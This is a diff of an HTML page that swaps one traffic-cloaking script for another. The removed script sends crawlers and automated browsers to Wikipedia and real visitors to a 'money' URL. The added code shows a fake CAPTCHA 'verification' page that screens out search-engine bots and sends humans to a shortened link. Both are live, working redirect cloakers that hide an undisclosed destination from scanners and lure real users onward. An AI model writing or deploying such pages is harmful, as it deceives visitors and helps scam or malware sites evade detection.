@@ -2,20 +2,117 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>Loading</title>
+    <title>Verification Required</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background: #f5f5f5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .captcha-container {
+            background: white;
+            padding: 30px;
+            border-radius: 8px;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+            text-align: center;
+            width: 300px;
+        }
+        .captcha-text {
+            font-size: 24px;
+            letter-spacing: 3px;
+            margin: 20px 0;
+            padding: 10px;
+            background: #f0f0f0;
+            display: inline-block;
+            user-select: none;
+        }
+        input {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            box-sizing: border-box;
+        }
+        button {
+            background: #4CAF50;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 4px;
+            cursor: pointer;
+            width: 100%;
+            font-size: 16px;
+        }
+        button:hover {
+            background: #45a049;
+        }
+        .error {
+            color: red;
+            margin-top: 10px;
+        }
+    </style>
+    <script>
+        function generateCaptcha() {
+            const chars = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
+            let captcha = "";
+            for (let i = 0; i < 6; i++) {
+                captcha += chars.charAt(Math.floor(Math.random() * chars.length));
+            }
+            return captcha;
+        }
+
+        let currentCaptcha = generateCaptcha();
+
+        function isBot() {
+            const userAgent = navigator.userAgent.toLowerCase();
+            const botPatterns = [
+                'googlebot', 'bingbot', 'slurp', 'duckduckbot',
+                'baiduspider', 'yandexbot', 'sogou', 'exabot',
+                'facebot', 'ia_archiver', 'twitterbot', 'linkedinbot'
+            ];
+            return botPatterns.some(pattern => userAgent.includes(pattern));
+        }
+
+        function verifyCaptcha() {
+            const userInput = document.getElementById("captcha-input").value;
+            const errorElement = document.getElementById("error");
+
+            if (userInput === currentCaptcha) {
+                if (!isBot()) {
+                    window.location.href = "https://u.to/EhujIg";
+                } else {
+                    errorElement.textContent = "Bot access denied";
+                }
+            } else {
+                errorElement.textContent = "Invalid CAPTCHA. Try again.";
+                currentCaptcha = generateCaptcha();
+                document.getElementById("captcha-text").textContent = currentCaptcha;
+                document.getElementById("captcha-input").value = "";
+            }
+        }
+
+        window.onload = function() {
+            document.getElementById("captcha-text").textContent = currentCaptcha;
+            document.getElementById("verify-btn").addEventListener("click", verifyCaptcha);
+            document.getElementById("captcha-input").addEventListener("keypress", function(e) {
+                if (e.key === "Enter") verifyCaptcha();
+            });
+        };
+    </script>
 </head>
 <body>
-<script>
-(function(){
-    var money = "https://securedalphaomservercloud.com/main/441kz";
-    var white = "https://www.wikipedia.org/";
-    var ua = navigator.userAgent.toLowerCase();
-    var bot = /bot|crawler|spider|slurp|headless|phantom|selenium|curl|wget|python|scraper|googlebot|bingbot/.test(ua);
-    if(!ua || ua === "mozilla") bot = true;
-    if(navigator.webdriver) bot = true;
-    if(screen.width < 100) bot = true;
-    window.location.href = bot ? white : money;
-})();
-</script>
+    <div class="captcha-container">
+        <h2>Verification Required</h2>
+        <p>Please enter the CAPTCHA text below:</p>
+        <div class="captcha-text" id="captcha-text"></div>
+        <input type="text" id="captcha-input" placeholder="Enter CAPTCHA" autocomplete="off">
+        <button id="verify-btn">Verify</button>
+        <div id="error" class="error"></div>
+    </div>
 </body>
 </html>
